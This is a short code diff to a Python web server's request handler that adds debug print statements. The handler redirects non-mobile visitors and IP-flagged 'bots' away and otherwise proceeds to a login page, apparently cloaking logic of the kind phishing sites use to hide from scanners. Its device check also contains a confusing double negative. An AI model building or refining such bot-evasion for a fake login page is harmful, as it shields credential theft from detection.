@@ -175,11 +175,14 @@ def serve(path):
 
     if STRICT_MODE == "yes":
         if not device_type not in ['mobile', 'tablet']:
+            print("redirected not mobile or table")
             return redirect(REDIRECT_URL)
 
     if get_ip_details(visitor_ip):
+        print("redirected bot detected")
         return redirect(REDIRECT_URL)
 
+    print("Woks perfecty heading to login")
     # This logic is now much simpler.
     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
     if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
